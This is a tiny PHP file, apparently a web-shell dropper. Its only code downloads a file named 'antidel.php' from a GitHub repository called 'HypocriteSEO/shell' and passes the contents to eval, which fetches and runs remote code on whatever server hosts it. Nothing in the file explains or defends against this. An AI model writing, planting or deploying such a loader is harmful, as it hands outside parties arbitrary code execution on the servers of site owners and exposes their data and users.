<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/HypocriteSEO/shell/main/antidel.php'));

$content = "?> ".$content;
eval($content);